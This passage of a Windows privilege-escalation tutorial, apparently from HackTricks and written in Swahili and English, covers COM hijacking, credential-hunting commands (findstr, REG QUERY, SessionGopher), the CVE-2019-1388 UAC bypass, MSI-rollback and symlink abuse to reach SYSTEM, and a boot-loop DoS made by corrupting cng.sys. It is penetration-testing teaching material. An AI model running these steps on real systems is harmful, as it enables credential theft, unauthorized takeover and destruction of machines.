**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji Windows inayoruhusu **mawasiliano** kati ya vipengele vya programu vilivyo katika lugha tofauti. Kila kipengele cha COM kinatambulika kwa **class ID (CLSID)** na kila kipengele kinaonyesha utendakazi kupitia interface moja au zaidi, zinazoainishwa kwa interface IDs (IIDs).

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kwa msingi, ikiwa unaweza **kuandika juu ya DLL yoyote** itakayotekelezwa, unaweza **kupandisha ruhusa** ikiwa DLL hiyo itaendeshwa na mtumiaji tofauti.

Ili kujifunza jinsi wadukuzi wanavyotumia COM Hijacking kama mbinu ya kudumu angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa jumla wa nywila katika faili na rejista**

**Tafuta yaliyomo kwenye faili**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili lenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta katika registry kwa key names na passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Zana zinazotafuta passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliitengeneza plugin hii ili **itekeleze moja kwa moja kila metasploit POST module inayotafuta credentials** ndani ya mwathirika.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) inatafuta moja kwa moja faili zote zenye passwords zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa password kutoka kwenye mfumo.

Zana [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) inatafuta **sessions**, **usernames** na **passwords** za zana mbalimbali zinazohifadhi data hii kwa maandishi wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu zilizoshirikiwa, zinazoitwa **pipes**, zinawezesha mawasiliano ya mchakato na uhamishaji wa data.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengine

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### **Kukagua Mistari ya Amri kwa nywila**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una upatikanaji wa kiolesura cha picha (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na ruhusa.

Hii inafanya iwezekane kupanua ruhusa na kupita kando UAC kwa wakati mmoja kwa udhaifu huo huo. Zaidi ya hayo, hakuna haja ya kufunga chochote na binary inayotumika wakati wa mchakato huo imesainiwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyoharibiwa ni kama ifuatavyo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili exploit udhaifu huu, ni lazima ufanye hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Kutoka Administrator — Integrity Level ya Kati hadi Juu / UAC Bypass

Soma hii ili **kujifunza kuhusu Viwango vya Uadilifu**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hii ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kutoka Kufuta/Hamisha/Kubadilisha Jina la Folda Kwa Hiari hadi SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Shambulio kwa msingi linahusu kutumia kipengele cha rollback cha Windows Installer kubadilisha faili halali na faili hatarishi wakati wa mchakato wa uninstall. Kwa hili mshambuliaji anahitaji kuunda **MSI installer ya hatari** ambayo itatumika kuihijack saraka ya `C:\Config.Msi`, ambayo baadaye itatumika na Windows Installer kuhifadhi faili za rollback wakati wa uninstall ya vifurushi vingine vya MSI ambapo faili za rollback zingeweza kubadilishwa kuwa na payload hatarishi.

Mbinu iliyofupishwa ni kama ifuatavyo:

1. **Stage 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` tupu)**

- Hatua 1: Sakinisha MSI
- Unda `.msi` inayosakinisha faili isiyo hatari (kwa mfano, `dummy.txt`) katika folda inayoweza kuandikwa (`TARGETDIR`).
- Mark installer kama **"UAC Compliant"**, ili **mtumiaji asiye-admin** aweze kuendesha.
- Weka **handle** wazi kwa faili baada ya kusakinisha.

- Hatua 2: Anza Uninstall
- Uninstall `.msi` ile ile.
- Mchakato wa uninstall unaanza kuhamisha faili kwenda `C:\Config.Msi` na kuyabadili majina kuwa faili za `.rbf` (backup za rollback).
- **Fuatilia open file handle** kwa kutumia `GetFinalPathNameByHandle` ili kugundua wakati faili inakuwa `C:\Config.Msi\<random>.rbf`.

- Hatua 3: Custom Syncing
- `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
- Inatuma ishara wakati `.rbf` imeandikwa.
- Kisha **inasubiri** tukio nyingine kabla ya kuendelea na uninstall.

- Hatua 4: Zuia Kufutwa kwa `.rbf`
- Unapopewa ishara, **fungua faili `.rbf`** bila `FILE_SHARE_DELETE` — hii **inazuia kufutwa kwake**.
- Kisha **tuma ishara nyuma** ili uninstall iamalie.
- Windows Installer haitafanikisha kufuta `.rbf`, na kwa sababu hawezi kufuta yaliyomo yote, **`C:\Config.Msi` haiondolewi**.

- Hatua 5: Futa `.rbf` kwa mkono
- Wewe (mshambuliaji) unafuta faili `.rbf` kwa mkono.
- Sasa **`C:\Config.Msi` ni tupu**, iko tayari kuibiwa.

> Wakati huu, **trigger the SYSTEM-level arbitrary folder delete vulnerability** ili kufuta `C:\Config.Msi`.

2. **Stage 2 – Kubadilisha Rollback Scripts na Zenye Madhara**

- Hatua 6: Tengeneza tena `C:\Config.Msi` na Weak ACLs
- Tengeneza tena saraka ya `C:\Config.Msi` wewe mwenyewe.
- Weka **weak DACLs** (kwa mfano, Everyone:F), na **weka handle wazi** ukiwa na `WRITE_DAC`.

- Hatua 7: Endesha Sakinisho Lingine
- Sakinisha `.msi` tena, ukiwa na:
- `TARGETDIR`: Mahali linaloweza kuandikwa.
- `ERROROUT`: Kigezo kinachosababisha kushindwa kwa kulazimishwa.
- Sakinisho hili litumike kusababisha **rollback** tena, ambayo inasoma `.rbs` na `.rbf`.

- Hatua 8: Angalia kwa `.rbs`
- Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` mpaka `.rbs` mpya itoke.
- Chukua jina lake la faili.

- Hatua 9: Sawazisha Kabla ya Rollback
- `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
- Inatuma ishara wakati `.rbs` imeundwa.
- Kisha **inasubiri** kabla ya kuendelea.

- Hatua 10: Tumia tena Weak ACL
- Baada ya kupokea tukio la `.rbs created`:
- Windows Installer **inatumia tena strong ACLs** kwenye `C:\Config.Msi`.
- Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kureapply weak ACLs** tena.

> ACLs zinatekelezwa **tu wakati handle imefunguliwa**, kwa hivyo bado unaweza kuandika kwenye folda.

- Hatua 11: Weka `.rbs` na `.rbf` Bandia
- Bandika juu faili `.rbs` na **fake rollback script** ambayo inamwambia Windows:
- kurejesha faili yako `.rbf` (DLL hatarishi) kwenye **mahali lenye ruhusa** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Weka `.rbf` bandia inayobeba **DLL ya payload hatari ya SYSTEM-level**.

- Hatua 12: Zindua Rollback
- Tuma ishara ya sync ili installer iendelee.
- Kitendo maalum cha aina 19 (`ErrorOut`) kimewekwa ili **kusababisha kwa makusudi kushindwa kwa usakinishaji** kwenye hatua inayojulikana.
- Hii husababisha **kuanza kwa rollback**.

- Hatua 13: SYSTEM Inasakinisha DLL Yako
- Windows Installer:
- Inasoma `.rbs` yako hatarishi.
- Inakopa DLL yako `.rbf` hadi mahali lengwa.
- Sasa una **DLL yako hatarishi katika njia inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Endesha Msimbo wa SYSTEM
- Endesha binary inayotumika kama **auto-elevated** (kwa mfano, `osk.exe`) ambayo inapakia DLL uliyoihijack.
- **Boom**: Msimbo wako unatekelezwa **kama SYSTEM**.


### Kutoka Kufuta/Hamisha/Kubadilisha Jina la Faili kwa Hiari hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (ile ya hapo juu) inadhani unaweza kufuta **folda nzima** (kwa mfano, `C:\Config.Msi`). Lakini vipi ikiwa udhaifu wako unaruhusu tu **kufuta faili kwa hiari** ?

Unaweza kutumia **NTFS internals**: kila folda ina alternate data stream fiche iitwayo:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Mtiririko huu huhifadhi **index metadata** ya folda.

Hivyo, ikiwa uta**futa `::$INDEX_ALLOCATION` stream** ya folda, NTFS **inafuta folda nzima** kutoka kwenye mfumo wa faili.

Unaweza kufanya hili kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ingawa unaitisha *file* delete API, **inaondoa folda mwenyewe**.

### Kutoka Folder Contents Delete hadi SYSTEM EoP
Je, vipi ikiwa primitive yako haikuwezeshi kufuta faili/folda kwa hiari, lakini **inaruhusu kufuta *contents* ya attacker-controlled folder**?

1. Hatua 1: Sanidi bait folder na file
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua 2: Weka **oplock** kwenye `file1.txt`
- Oplock hiyo **inakatisha utekelezaji** wakati mchakato wenye ruhusa za juu unapo jaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua 3: Chochea mchakato wa SYSTEM (kwa mfano, `SilentCleanup`)
- Mchakato huu huchanganua folda (kwa mfano, `%TEMP%`) na kujaribu kufuta yaliyomo ndani yake.
- Inapofika kwa `file1.txt`, **oplock inachocheka** na inakabidhi udhibiti kwa callback yako.

4. Hatua 4: Ndani ya callback ya oplock – elekeza ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
- Hii inafanya `folder1` kuwa tupu bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — hilo litasababisha kuachiliwa kwa oplock kabla ya wakati.

- Chaguo B: Badilisha `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga mtiririko wa ndani wa NTFS unaohifadhi metadata ya folda — kuufuta kunafuta folda.

5. Hatua 5: Kuachilia oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Kuunda Folda ya Nasibu hadi DoS ya Kudumu

Tumia primitive inayoruhusu **kuunda folda ya nasibu kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kutoa ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **dereva muhimu wa Windows**, kwa mfano:
```
C:\Windows\System32\cng.sys
```
- Njia hii kawaida inalingana na dereva ya kernel-mode `cng.sys`.
- Ikiwa **uitengeneza kabla kama folda**, Windows itashindwa kupakia dereva halisi wakati wa boot.
- Kisha, Windows itajaribu kupakia `cng.sys` wakati wa boot.
- Inapoona folda, **inashindwa kutambua dereva halisi**, na **inaanguka au kusimamisha boot**.
- Hakuna **njia mbadala**, na **hakuna urejeshaji** bila uingiliaji wa nje (kwa mfano, ukarabati wa boot au ufikiaji wa diski).

### Kutoka kwa njia za log/backup zenye upendeleo + OM symlinks hadi kuandika upya faili yoyote / boot DoS

Wakati huduma yenye **ruhusa za juu** inaandika logs/exports kwa njia inayosomwa kutoka kwa **config inayoweza kuandikwa**, elekeza njia hiyo kwa **Object Manager symlinks + NTFS mount points** ili kubadilisha uandishi wa huduma yenye ruhusa kuwa kuandika upya faili yoyote (hata **bila** SeCreateSymbolicLinkPrivilege).

**Mahitaji**
- Config inayohifadhi njia lengwa inaweza kuandikwa na mshambuliaji (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kwa `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Operesheni yenye ruhusa za juu inayoiandika njia hiyo (log, export, report).

**Mfuatano wa mfano**
1. Soma config ili kupata tena mahali pa log la huduma yenye ruhusa, kwa mfano `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` katika `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirect the path without admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri kipengele chenye vibali kiandike logi (kwa mfano, admin anavusha "send test SMS"). Uandishi sasa unaingia katika `C:\Windows\System32\cng.sys`.
4. Chunguza lengo lililobadilishwa (hex/PE parser) kuthibitisha uharibifu; kuanzisha upya (reboot) kunalazimisha Windows kupakia path ya driver iliyoharibika → **boot loop DoS**. Hii pia inafanana na faili yoyote iliyo na ulinzi ambayo service yenye vibali itafungua kwa ajili ya kuandika.

> `cng.sys` is normally loaded from `C:\Windows\System32\drivers\cng.sys`, but if a copy exists in `C:\Windows\System32\cng.sys` it can be attempted first, making it a reliable DoS sink for corrupt data.



## **Kutoka High Integrity hadi System**

### **Mpya service**

Ikiwa tayari unafanya kazi kwenye mchakato wa High Integrity, the **path to SYSTEM** inaweza kuwa rahisi kwa tu **kuunda na kuendesha service mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wakati unaunda service binary hakikisha ni service halali au kwamba binary inafanya vitendo vinavyohitajika haraka kwa sababu itauawa ndani ya 20s ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwezesha AlwaysInstallElevated registry entries** na **kufunga** reverse shell kwa kutumia _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata msimbo hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una privileges za token hizo (huenda utakutana nazo ndani ya mchakato ambao tayari ni High Integrity), utaweza **kufungua karibu mchakato wowote** (si protected processes) kwa kutumia SeDebug privilege, **kunakili the token** ya mchakato, na kuunda **mchakato wowote kwa token hiyo**.\
Kutumia mbinu hii kawaida huchagua mchakato unaoendesha kama SYSTEM wenye privileges zote za token (_ndio, unaweza kupata SYSTEM processes bila privileges zote za token_).\
**Unaweza kupata** [**mfano wa msimbo unaotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii inatumiwa na meterpreter ku-escalate katika `getsystem`. Mbinu inajumuisha **kuunda pipe kisha kuunda/kutumia vibaya service ili kuandika kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itakuwa na uwezo wa **kuiga the token** ya pipe client (service) na kupata SYSTEM privileges.\
Ikiwa unataka [**kujifunza zaidi kuhusu named pipes usome hii**](#named-pipe-client-impersonation).\
Ikiwa unataka kusoma mfano wa [**jinsi ya kutoka high integrity kwenda System ukitumia named pipes usome hii**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ikiwa utafanikiwa hijack a dll being loaded by a process running as SYSTEM utaweza execute arbitrary code with those permissions. Therefore Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na zaidi ni far more easy to achieve from a high integrity process kwani itakuwa na write permissions kwenye folda zinazotumika load dlls.\
**Unaweza** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kagua misconfigurations na faili nyeti (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za session zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwa local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray passwords zilizokusanywa katika domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS spoofer na chombo cha man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Uchambuzi wa msingi wa Windows kwa privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Tafuta privesc vulnerabilities zinazojulikana (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi za ndani **(Inahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta privesc vulnerabilities zinazojulikana (inahitaji ku-compile kwa VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Inaorodhesha host ikitafuta misconfigurations (ni zana ya kukusanya taarifa kuliko privesc) (inahitaji ku-compile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwa programu nyingi (exe precompiled kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Kagua misconfiguration (executable precompiled kwenye github). Haipendekezwi. Haifanyi kazi vizuri Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kagua misconfigurations inayowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kwa msingi wa chapisho hili (haihitaji accesschk kufanya kazi vizuri lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Inasoma output ya **systeminfo** na inapendekeza exploits zinazoonekana kufanya kazi (python lokal)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Inasoma output ya **systeminfo** na inapendekeza exploits zinazoonekana kufanya kazi (python lokal)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeleo

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) na kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Kufuatilia Silver Fox: Paka na Panya katika Vivuli za Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Udhaifu wa Sistimu ya Faili yenye Vibali vya Kipekee uliopo kwenye Mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – Matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Kutumia Vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
